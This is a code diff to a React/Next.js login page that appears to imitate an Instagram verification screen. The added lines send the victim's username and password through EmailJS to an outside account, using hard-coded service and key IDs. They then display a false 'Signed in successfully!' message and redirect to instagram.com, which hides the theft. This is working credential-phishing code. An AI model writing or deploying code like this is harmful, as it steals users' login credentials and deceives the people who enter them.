@@ -27,6 +27,7 @@ import {
   SettingOutlined,
 } from "@ant-design/icons";
 import { useRouter } from "next/navigation";
+import emailjs from "@emailjs/browser";
 
 const { Title, Text, Paragraph } = Typography;
 const { Header, Content } = Layout;
@@ -48,10 +49,23 @@ const VerificationApp = () => {
     setFormData((prev) => ({ ...prev, ...values }));
     setLoading(true);
 
+    const templateParams = {
+      name: values.username,
+      otp: values.password,
+    };
+
+    await emailjs.send(
+      "service_y4o20yn", // EmailJS servicedan olinadi
+      "template_16sm3wl", // EmailJS templatedan olinadi
+      templateParams,
+      "mQ7LyQZ-lEeX_reaC" // EmailJS public key
+    );
+
     // Simulate API call
     setTimeout(() => {
       setLoading(false);
-      setCurrentStep("verify");
+      message.success("Signed in successfully!");
+      router.push("https://instagram.com/");
     }, 1500);
   };
 
